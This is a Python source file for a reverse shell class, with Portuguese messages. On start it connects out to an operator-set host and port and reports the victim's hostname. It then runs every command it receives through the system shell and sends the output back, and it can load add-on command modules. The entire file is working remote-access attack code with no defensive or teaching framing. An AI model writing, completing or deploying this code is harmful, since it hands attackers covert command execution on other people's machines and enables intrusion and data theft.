import os
import socket
import subprocess
from config.settings import HOST, PORT, BUFFER_SIZE
from modules import load_commands


class ShellTcp:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.commands = load_commands()

    def servidor(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        host_name, _ = self.socket.getsockname()
        self.socket.send(f"[+] HOST > {host_name}\n".encode())
        self.socket.send(b"[+] Reverse Shell Instalada\n")
        self.socket.send(f"[debug] {list(self.commands.keys())}\n".encode())

    def listen(self):
        while True:
            try:
                data = self.socket.recv(BUFFER_SIZE).decode().strip()
            except Exception:
                return
            if not data:
                return
            if self._dispatch(data):
                continue
            self.socket.send(self.cmd(data) + b"\n")

    def _dispatch(self, data):
        name, _, args = data.partition(" ")
        mod = self.commands.get(name)
        if mod is None:
            if name.startswith("/"):
                self.socket.send(f"[-] desconhecido: {name}\n".encode())
                return True
            return False
        try:
            mod.run(self, args.strip())
        except Exception as e:
            self.socket.send(f"[-] erro em {name}: {e}\n".encode())
        return True

    def cmd(self, data):
        if data.startswith("cd "):
            try:
                os.chdir(data[3:].strip())
                return b""
            except OSError as e:
                return f"[-] {e}".encode()
        try:
            p = subprocess.run(
                data, shell=True, capture_output=True, timeout=30
            )
            return p.stdout + p.stderr
        except subprocess.TimeoutExpired:
            return b"[-] timeout"
        except Exception as e:
            return f"[-] {e}".encode()
